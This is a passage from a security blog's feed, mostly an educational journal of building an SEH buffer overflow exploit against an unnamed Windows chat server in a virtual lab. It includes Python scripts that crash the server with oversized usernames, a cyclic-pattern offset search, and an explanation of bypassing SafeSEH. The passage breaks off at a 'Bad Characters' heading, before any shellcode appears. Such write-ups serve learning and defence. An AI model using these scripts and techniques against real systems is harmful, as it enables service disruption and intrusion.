<p><a href="./../../../wp-content/uploads/2017/08/WP_20170801_17_20_39_Rich_LI-2.png"><img loading="lazy" decoding="async" class=" wp-image-278 aligncenter" src="./../../../wp-content/uploads/2017/08/WP_20170801_17_20_39_Rich_LI-2-169x300.png" alt="" width="231" height="410" srcset="./../../../wp-content/uploads/2017/08/WP_20170801_17_20_39_Rich_LI-2-169x300.png 169w, ./../../../wp-content/uploads/2017/08/WP_20170801_17_20_39_Rich_LI-2-118x210.png 118w, ./../../../wp-content/uploads/2017/08/WP_20170801_17_20_39_Rich_LI-2.png 577w" sizes="(max-width: 231px) 100vw, 231px" /></a></p>
<p><figure id="attachment_215" aria-describedby="caption-attachment-215" style="width: 660px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/lan-tap-nmap.png"><img loading="lazy" decoding="async" class="wp-image-215" src="./../../../wp-content/uploads/2017/08/lan-tap-nmap-300x150.png" alt="" width="660" height="330" data-wp-pid="215" srcset="./../../../wp-content/uploads/2017/08/lan-tap-nmap-300x150.png 300w, ./../../../wp-content/uploads/2017/08/lan-tap-nmap-768x384.png 768w, ./../../../wp-content/uploads/2017/08/lan-tap-nmap-210x105.png 210w, ./../../../wp-content/uploads/2017/08/lan-tap-nmap.png 818w" sizes="(max-width: 660px) 100vw, 660px" /></a><figcaption id="caption-attachment-215" class="wp-caption-text">Nmap scan</figcaption></figure></p>
<p><figure id="attachment_206" aria-describedby="caption-attachment-206" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/lan-tap-cap.png"><img loading="lazy" decoding="async" class="wp-image-206" src="./../../../wp-content/uploads/2017/08/lan-tap-cap-300x169.png" alt="" width="661" height="372" data-wp-pid="206" srcset="./../../../wp-content/uploads/2017/08/lan-tap-cap-300x169.png 300w, ./../../../wp-content/uploads/2017/08/lan-tap-cap-1024x576.png 1024w, ./../../../wp-content/uploads/2017/08/lan-tap-cap-768x432.png 768w, ./../../../wp-content/uploads/2017/08/lan-tap-cap-210x118.png 210w, ./../../../wp-content/uploads/2017/08/lan-tap-cap.png 1366w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-206" class="wp-caption-text">Packet analysis with Wireshark</figcaption></figure></p>
<p>Given that it&#8217;s highly portable, easy to use and invisible to network scans, I suspect this little gadget will be getting plenty of use in the field in the near future.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Windows SEH Buffer Overflow Exploit</title>
		<link>./../../../win7-seh-buffer-overflow-exploit/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Thu, 22 Jun 2017 12:58:32 +0000</pubDate>
				<category><![CDATA[Windows Exploits]]></category>
		<category><![CDATA[Buffer Overflow]]></category>
		<category><![CDATA[Exploits]]></category>
		<category><![CDATA[Kali]]></category>
		<category><![CDATA[Metasploit]]></category>
		<category><![CDATA[SEH]]></category>
		<category><![CDATA[Windows]]></category>
		<guid isPermaLink="false">./../../../index.html?p=48</guid>

					<description><![CDATA[Introduction This post describes the process of developing an exploit for a stack-based buffer overflow vulnerability within a Windows application, with the aim of gaining remote access to the underlying host. The exploit will employ a technique which abuses the native Windows Structured Exception Handling (SEH) mechanism to gain control over process execution. It is [&#8230;]]]></description>
										<content:encoded><![CDATA[<h2>Introduction</h2>
<p>This post describes the process of developing an exploit for a stack-based buffer overflow vulnerability within a Windows application, with the aim of gaining remote access to the underlying host. The exploit will employ a technique which abuses the native Windows Structured Exception Handling (SEH) mechanism to gain control over process execution.</p>
<p><span id="more-48"></span></p>
<p>It is worth noting that the purpose of this post is to act as a journal, documenting the steps followed and the results obtained during the process of building this exploit, in the hope it may be of help to others also seeking to learn more about the field of exploit development. I don&#8217;t claim to have discovered a previously unknown exploit for the vulnerability under scrutiny, nor do I claim to have developed any new techniques for leveraging SEH. The technique described here is well documented in countless other blogs, articles and technical papers. Experience has taught me that knowledge acquired by &#8220;doing and then documenting&#8221; tends to stick much more firmly in the grey matter and this post is the output of that activity. I believe the notes will prove useful to me in the future as a source of reference; if they help out others too, then all the better.</p>
<p>NB: I have made a point of not revealing the identity of the vulnerable Windows application targeted in this exercise. This is simply a personal choice: the application&#8217;s vulnerabilities (and exploits for them) are well known, so I wouldn&#8217;t be revealing anything that isn&#8217;t already common knowledge in information security circles. However, given that (a) the vulnerable version of the application is still available for download trial and/or purchase, and (b) this post is concerned only with the generic process of developing an SEH buffer overflow exploit, I see no real reason to do anything which contributes to the degradation of the security posture of any community or organisation unlucky enough to still be using this application.</p>
<h2>Test Lab</h2>
<p>The test lab environment will be fully virtualised: the attack host will be a <a href="https://www.kali.org/">Kali</a> 2017.1 VM and the target host will be a Windows 7 SP1 Home Edition VM. These will be running within the Oracle <a href="https://www.virtualbox.org/">Virtualbox</a> hypervisor with <a href="https://www.centos.org/">Centos 7</a> as the host operating system.</p>
<p><a href="./../../../wp-content/uploads/2017/06/vms.png"><img loading="lazy" decoding="async" class="wp-image-139 aligncenter" src="./../../../wp-content/uploads/2017/06/vms-300x169.png" alt="" width="662" height="373" srcset="./../../../wp-content/uploads/2017/06/vms-300x169.png 300w, ./../../../wp-content/uploads/2017/06/vms-1024x576.png 1024w, ./../../../wp-content/uploads/2017/06/vms-768x432.png 768w, ./../../../wp-content/uploads/2017/06/vms-210x118.png 210w, ./../../../wp-content/uploads/2017/06/vms.png 1366w" sizes="(max-width: 662px) 100vw, 662px" /></a></p>
<h2>Vulnerability Details</h2>
<p>The <a href="https://cve.mitre.org/index.html">CVE</a> description doesn&#8217;t give too much away, but it does tell us that the vulnerability is related to the processing of authentication requests sent to the application over a TCP/IP connection using the HTTP/HTTPS protocol. More specifically, it tells us that the vulnerability manifests itself when an overly long user name string is sent as a parameter within the authentication request, which results in a stack-based buffer overflow.</p>
<h2>Intercepting Requests</h2>
<p>By downloading, installing and running an evaluation copy of the application, we can see that it exposes an HTTP/HTTPS web interface on the standard ports (80 and 443). For the sake of simplicity, we&#8217;ll just focus on the non-encrypted HTTP interface for now. We don&#8217;t have any details of the structure of requests sent to (or responses received from) this interface, so the first thing we need to do is to examine a sample of network traffic captured during an authentication session, to see if that will provide us with any clues. An interception proxy such as <a href="https://portswigger.net/burp/">Burp Suite</a> can be used for this purpose. By configuring a web browser to route its traffic via the proxy, we can eavesdrop on traffic exchanged between the browser and the server:</p>
<p><figure id="attachment_40" aria-describedby="caption-attachment-40" style="width: 603px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52.png"><img loading="lazy" decoding="async" class="wp-image-40" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-300x172.png" alt="" width="603" height="346" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-300x172.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-210x121.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52.png 614w" sizes="(max-width: 603px) 100vw, 603px" /></a><figcaption id="caption-attachment-40" class="wp-caption-text">Authentication request captured in Burp Suite</figcaption></figure></p>
<p>Looking at the raw request, we can see that a number of arguments are passed to the server as URL-encoded parameters, including the one we&#8217;re interested in: the name of the user. The fact that both the username and the password are both passed in cleartext over an unencrypted channel is clearly not ideal from a security point of view, but that&#8217;s a side issue!.</p>
<p>Now we know the general structure of the request, we can use this information to construct a script which will allow us to generate requests similar to those transmitted by the browser, and crucially will allow us to programmatically vary the length and content of the user name argument.</p>
<h2>Fuzzing Inputs</h2>
<p>The first task is to determine whether we can replicate the buffer overflow detailed in the vulnerability report. At this point, all we know is that the overflow is caused by supplying an overly long user name argument. We don&#8217;t know <em>how</em> long the string needs to be, so we&#8217;ll employ a technique known as <a href="https://www.owasp.org/index.php/Fuzzing">fuzzing</a>, which involves progressively increasing the string length supplied to the server until the overflow occurs. Based on the information we&#8217;ve acquired via Burp Suite, this is the script we will use:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

char = "A"
buff = [char]
step = 200
count = 100
victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

# build a list of strings representing usernames of increasing length
while len(buff) &lt;= 30:
    buff.append(char * count)
    count += step
for usr_name in buff:
    print "Sending %s user name bytes..." % len(usr_name)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = sock.connect((victim_host, victim_port))
    content = get_request_template.replace(usr_tok, usr_name)
    #print content
    sock.send(content)
    rx = sock.recv(1024)
    if len(rx) &gt; 0:
        print rx
sock.close()
</pre>
<p>Notice that the value of the &#8220;Connection&#8221; header in the GET request has been changed from &#8220;close&#8221; to &#8220;Keep-Alive&#8221; so that a persistent connection is establised; this allows multiple requests to be sent during the fuzzing operation without the need to set up and tear down the connection each time.</p>
<p>Executing the script on the attack host causes the following responses to be transmitted back from the server:</p>
<p><figure id="attachment_41" aria-describedby="caption-attachment-41" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38.png"><img loading="lazy" decoding="async" class="wp-image-41" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-300x138.png" alt="" width="661" height="304" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-300x138.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-1024x471.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-768x354.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-210x97.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38.png 1360w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-41" class="wp-caption-text">Server responses received during fuzzing</figcaption></figure></p>
<p>As the script executes, it repeatedly sends fabricated authenticated requests to the server, increasing the user name argument (which is just a series of &#8220;A&#8221; characters) by 10 bytes on each iteration. We can see that when the argument length reaches 220 bytes, the server stops responding. That fact that we don&#8217;t receive an HTTP error message is a good indication that an unhandled irrecoverable error has occurred at the server end, so it looks like we may have successfully forced the buffer overflow to occur. Looking at the server host desktop, it&#8217;s clear that something untoward has occurred:</p>
<p><figure id="attachment_70" aria-describedby="caption-attachment-70" style="width: 481px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-002.png"><img loading="lazy" decoding="async" class="wp-image-70" src="./../../../wp-content/uploads/2017/06/ecs-win-002-300x249.png" alt="" width="481" height="399" srcset="./../../../wp-content/uploads/2017/06/ecs-win-002-300x249.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-002-210x174.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-002.png 557w" sizes="(max-width: 481px) 100vw, 481px" /></a><figcaption id="caption-attachment-70" class="wp-caption-text">Server error</figcaption></figure></p>
<h2>Debugging The Server</h2>
<p>Our malicious authentication request has crashed the server application and will have left the processes it created and the memory space it occupies in an indeterminate state. To establish whether we can make use of this situation, we need to examine the internal state of the server using a debugger. For this exercise, we will use <a href="http://www.ollydbg.de/">OllyDbg</a>.</p>
<p>After restarting the server, we attach the debugger to the server process and allow it to run:</p>
<p><figure id="attachment_73" aria-describedby="caption-attachment-73" style="width: 640px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-006.png"><img loading="lazy" decoding="async" class="wp-image-73" src="./../../../wp-content/uploads/2017/06/ecs-win-006-300x92.png" alt="" width="640" height="196" srcset="./../../../wp-content/uploads/2017/06/ecs-win-006-300x92.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-006-768x235.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-006-210x64.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-006.png 872w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-73" class="wp-caption-text">Attaching the debugger to the server process</figcaption></figure></p>
<p>At the attack host, because we now know that the length of the user name argument needed to cause the crash must be at least 220 bytes, we will revise our script so that instead of fuzzing the server, it just sends a single fixed length string of 300 bytes (the extra 80 bytes is an arbitrary length just to see how far we can oveflow into stack memory):</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = "A" * 300
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()
</pre>
<p>We send the request to the server, wait for the crash to occur, then examine the aftermath in OllyDbg &#8211; the status bar message tells us that an access voilation exception has occurred:</p>
<p><figure id="attachment_82" aria-describedby="caption-attachment-82" style="width: 654px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-copy.png"><img loading="lazy" decoding="async" class="wp-image-82" src="./../../../wp-content/uploads/2017/06/ecs-win-008-copy-300x177.png" alt="" width="654" height="386" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-copy-300x177.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-copy-210x124.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-copy.png 477w" sizes="(max-width: 654px) 100vw, 654px" /></a><figcaption id="caption-attachment-82" class="wp-caption-text">Access Violation Exception in server process</figcaption></figure></p>
<h2>Register Corruption</h2>
<p>In a &#8220;classic&#8221; buffer overflow scenario, the aim is to cause the <a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">Extended Instruction Pointer (EIP)</a> register to be overwritten with a value of our own choosing. The system interprets the value in the EIP as the address of the next instruction to execute, so if we are able to overwrite the EIP with a value which happens to be the memory address of an instruction to jump to the address of the <a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#General-Purpose_Registers_.28GPR.29_-_16-bit_naming_conventions">Extended Stack Pointer (ESP)</a> register (which we also overwrite with the address of some malicious code inserted by us elsewhere in memory), we can assume control of the hijacked process, and force it to execute the instructions we supply instead of its own.</p>
<p>This strategy relies on a number of preconditions being true. First, the area of stack memory allocated as a buffer for the operation within by the process causing the overflow must be located at an address lower than the address of the EIP and ESP registers, and within &#8220;overflow-able&#8221; range of them. Second, the process under attack must not have been compiled with any of the compiler directives which add countermeasures aimed at preventing overflows from occurring in the first place, such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">Stack Canaries</a>.</p>
<p>Assuming this is the case, when the process executes the instruction which attempts to write a value too large for the allocated stack buffer, data will be written beyond the end of the buffer and hopefully into the EIP and ESP registers.</p>
<p>In this case however, that doesn&#8217;t appear to have happened. At the point at which the process crashes, the EIP seems to contain a valid address:</p>
<p><figure id="attachment_86" aria-describedby="caption-attachment-86" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-003.png"><img loading="lazy" decoding="async" class="wp-image-86" src="./../../../wp-content/uploads/2017/06/ecs-win-008-003-300x153.png" alt="" width="661" height="337" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-003-300x153.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-003-210x107.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-003.png 653w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-86" class="wp-caption-text">EIP not overwritten</figcaption></figure></p>
<p>So what&#8217;s going on ? If we look at the current instruction, i.e. the one being excuted as the crash occurs, we can see that the system is being told to deference the pointer given by the current value of ECX register + 4 bytes, read the 32-bit value at the address and then write it back to the ECX register:</p>
<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="asm">MOV ECX, DWORD  PTR DS:[ECX+4]</code></p>
<p>The problem is that the ECX register doesn&#8217;t contain a valid memory address &#8211; it contains the hex value &#8220;41414141&#8221; &#8211; the ASCII value for which is &#8220;AAAA&#8221;. Our malicious user name string contains a long sequence of ASCII &#8220;A&#8221; characters, so it appears that our buffer has overflowed into the ECX register:</p>
<p><figure id="attachment_78" aria-describedby="caption-attachment-78" style="width: 659px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-1.png"><img loading="lazy" decoding="async" class="wp-image-78" src="./../../../wp-content/uploads/2017/06/ecs-win-008-1-300x213.png" alt="" width="659" height="468" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-1-300x213.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-1-210x149.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-1.png 508w" sizes="(max-width: 659px) 100vw, 659px" /></a><figcaption id="caption-attachment-78" class="wp-caption-text">ECX register contains an invalid memory address</figcaption></figure></p>
<h2>Structured Exception Handling</h2>
<p>Why did this cause the process to stop executing ? We can see from the debugger that an Access Violation Exception was thrown, meaning somehow the system knew that it was being asked to read from the a non-existent or otherwise non-accessible memory location. This might be either because the server code contains an exception handler written specifically to handle this type of occurrence, or in the absence of such a handler, because the access violation was detected by the operating system itself. <a href="https://www.microsoft.com/msj/0197/exception/exception.aspx">Structured Exception Handling (SEH)</a> a Win32 mechanism which exists to ensure that at a low level, exceptions are handled consistently. From the point of view of this exercise, it doesn&#8217;t really matter where the detection of the violation occurred, only that it was detected within the SEH context. We can be confident that SEH will deal with exception in the same way regardless of it&#8217;s origin; this will help us to predict what processing is invoked next, and how we can use that to our advantage.</p>
<p>Each thread spawned by a process is assigned it&#8217;s own list of exception handlers. When a problem occurs, the operating system consults this list in an attempt to find a handler which can deal with the detected problem. The location in memory of this list of handlers is important to us, because the list is a linked list, meaning that each entry in the list contains a pointer to the address of the next entry. We know that when an error occurs, the operating system will jump to and excute one of the handlers in this list. So, if we can overwrite the pointer which contains the address of the start of the list, we will be able to control the flow of execution. The SEH handler list is positioned at a location in the stack after that used to store local variables, so a sufficiently large buffer overflow might allow us to overwrite one of the pointers to an SEH handler.</p>
<p>OllyDbg allows us to inspect the state of the SEH handler chain for a give thread, so let&#8217;s take a look our crashed server process:</p>
<p><figure id="attachment_30" aria-describedby="caption-attachment-30" style="width: 649px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008.png"><img loading="lazy" decoding="async" class="wp-image-30" src="./../../../wp-content/uploads/2017/06/ecs-win-008-300x271.png" alt="" width="649" height="586" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-300x271.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-210x190.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008.png 627w" sizes="(max-width: 649px) 100vw, 649px" /></a><figcaption id="caption-attachment-30" class="wp-caption-text">SEH chain for the currently executing thread</figcaption></figure></p>
<p>In the Threads view, the entry at the top of the list represents the currently executing thread. If we select this thread and display its &#8220;Data Dump&#8221; view, we can see that execution stopped at the start of the SEH chain, meaning that the exception we caused is indeed being handled by SEH. Even more interesting is that pointer (&#8220;Next SEH Handler&#8221;) identifying the address of the current SEH handler appears to have been overwritten by our malicious string &#8220;41414141&#8221; = ASCII &#8220;AAAA&#8221;.</p>
<h2>Determining the &#8220;Next SEH&#8221; Offset</h2>
<p>Being able to overwrite Next SEH pointer value is encouraging, but a series of &#8220;A&#8221; characters doesn&#8217;t tell us much. Which 4 bytes of the 300 byte string of &#8220;A&#8221; characters actually overwrote the pointer ? If we can determine this, we can replace those 4 bytes with something more useful &#8211; like an address to somewhere else in memory that we can control. One way to do this is to replace the 300 byte string with a sequence of characters containing a pattern which allows the position of any substring within the sequence to be uniquely identified. The position of the characters which overwrite the Next SEH pointer will then tell what offset needs to be prepended to the address we supply, to ensure that it gets inserted at the right location.</p>
<p>The <a href="https://www.metasploit.com/">Metasploit Framework</a> contains a Ruby <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">script</a> which performs this for us &#8211; we just need to supply the desired sequence length as an argument:</p>
<p><figure id="attachment_42" aria-describedby="caption-attachment-42" style="width: 659px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11.png"><img loading="lazy" decoding="async" class="wp-image-42" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-300x46.png" alt="" width="659" height="101" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-300x46.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-1024x156.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-768x117.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-210x32.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11.png 1356w" sizes="(max-width: 659px) 100vw, 659px" /></a><figcaption id="caption-attachment-42" class="wp-caption-text">The pattern_create script within the Metasploit Framework.</figcaption></figure></p>
<p>We can now update our attack script, replacing the &#8220;A&#8221; characters with our newly generated sequence:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = (
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac"
"8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af"
"7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
"6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()
</pre>
<p>After restarting the server and sending the new authentication request, we see the following in the debugger:</p>
<p><figure id="attachment_31" aria-describedby="caption-attachment-31" style="width: 657px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-011.png"><img loading="lazy" decoding="async" class="wp-image-31" src="./../../../wp-content/uploads/2017/06/ecs-win-011-300x121.png" alt="" width="657" height="265" srcset="./../../../wp-content/uploads/2017/06/ecs-win-011-300x121.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-011-768x311.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-011-210x85.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-011.png 907w" sizes="(max-width: 657px) 100vw, 657px" /></a><figcaption id="caption-attachment-31" class="wp-caption-text">Pointer to Next SEH handler overwritten with a unique character sequence</figcaption></figure></p>
<p>We can see that the Next SEH Handler pointer value has been overwritten with the ASCII characters &#8220;7Ag8&#8221;. We can use another Metasploit Framework Ruby <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">script</a> to tell the location of the start of this substring in the sequence:</p>
<p><figure id="attachment_43" aria-describedby="caption-attachment-43" style="width: 651px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35.png"><img loading="lazy" decoding="async" class="wp-image-43" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-300x47.png" alt="" width="651" height="102" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-300x47.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-1024x162.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-768x122.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-210x33.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35.png 1359w" sizes="(max-width: 651px) 100vw, 651px" /></a><figcaption id="caption-attachment-43" class="wp-caption-text">Location of the substring within the character sequence</figcaption></figure></p>
<p>The substring is located at an offset of 203, so we now know that we have the ability to reliably overwrite the address referenced by the Next SEH Handler with 4 bytes. But how do we determine the address of the SEH Handler itself ? Fortunately, we know from reading various Microsoft Win32 publications (including <a href="https://www.microsoft.com/msj/0197/exception/exception.aspx">this one</a>) that the SEH handler is located at the address of the Next SEH Handler pointer + 4 bytes. Great, so potentially we can just insert our malicious code at the SEH handler location ? Unfortunately not, because The SEH handler is actually a pointer to a function. Inserting code to be executed directly as instructions is not an option; we need the SEH handler to point to another address instead.</p>
<p>We know from the way in which SEH works that when exception handling commences, a frame responsible for managing the execution of the exception is set up within the associated thread&#8217;s stack, with the address of the Next SEH Handler pointer at the top of the frame. Crucially, we also know that this start of this structure is always located at an address 8 bytes higher than that of the ESP register. If we can use this information to replace the SEH handler function pointer with an address to some instructions which manipulate the stack, such that the address of the next SEH handler ends up being located at the top of the stack, we should be able to gain control of execution.</p>
<h2>SafeSEH</h2>
<p>An additional complication is that Windows executables and libraries are by default compiled with an overwrite protection mechanism called <a href="https://msdn.microsoft.com/en-us/library/9a89h429.aspx">SafeSEH</a>, which validates the address of SEH handlers before allowing them to be executed. If we were to overwrite the handler address so that it pointed to an address which was not in the list of valid SEH handler addresses, this feature would prevent the instructions at that location from being executed and our exploit would fail. Fortunately for us there is a loophole: if the address we use happens to be within a separate module which was <em><strong>not</strong></em> compiled with SafeSEH enabled, this protection mechanism is bypassed.</p>
<p><strong>NB:</strong> <em>All newer versions of the Windows OS contain a built-in overwrite mitigation feature called <a href="https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/">SEHOP</a> which detects corrupt Next SEH pointer values and stops the associated handler from being executed. SEHOP is tends to be enabled by default on Windows Server versions and disabled by default on Windows Desktop versions. For the purposes of this exercise, we will assume that this feature is disabled</em>.</p>
<h2>Delegation Of Stack Manipulation</h2>
<p>So, we now know that if we insert hex characters representing the address of a memory location into our exploit string starting at position 203 + 4 bytes, we should be able to coerce the system into treating that address as the pointer of the exception handler function. As a result, the address will get loaded into the EIP and whatever is at that address will be executed. We also know that our &#8220;bogus&#8221; exception handler must somehow cause the address of the next exception handler to be presented at the top of the stack, and return execution back from the current exception handler. Because we know where the exception dispatcher frame is on the stack, we know that can acheive this by popping 2 x 4 bytes off the top of the stack and then executing a return instruction, so we need to use the instruction sequence: <code class="EnlighterJSRAW" data-enlighter-language="asm">POP xxx POP xxx RETN</code>. This would have the effect of placing the address of the next exception handler into the ESP, and causing execution to resume from that address. If that address happens to be the address of the next stage exploit code, then we are in business.</p>
<p>To bypass SafeSEH, we need to search through the non-SafeSEH modules loaded by the server process which contain the instruction sequence <code class="EnlighterJSRAW" data-enlighter-language="asm">POP xxx POP xxx RETN</code>. We can then make use of this module by inserting the address of the start of this sequence into our malicious authentication request argument, causing the SEH handler function pointer to be overwritten, thereby delegating the business of manipulating the stack to the module.</p>
<p>We can use OllyDbg to help us identify modules loaded by the server process:</p>
<p><figure id="attachment_33" aria-describedby="caption-attachment-33" style="width: 658px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-017.png"><img loading="lazy" decoding="async" class="wp-image-33" src="./../../../wp-content/uploads/2017/06/ecs-win-017-300x77.png" alt="" width="658" height="169" srcset="./../../../wp-content/uploads/2017/06/ecs-win-017-300x77.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-017-210x54.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-017.png 761w" sizes="(max-width: 658px) 100vw, 658px" /></a><figcaption id="caption-attachment-33" class="wp-caption-text">Executable modules loaded by the server</figcaption></figure></p>
<h3>Bad Characters</h3>
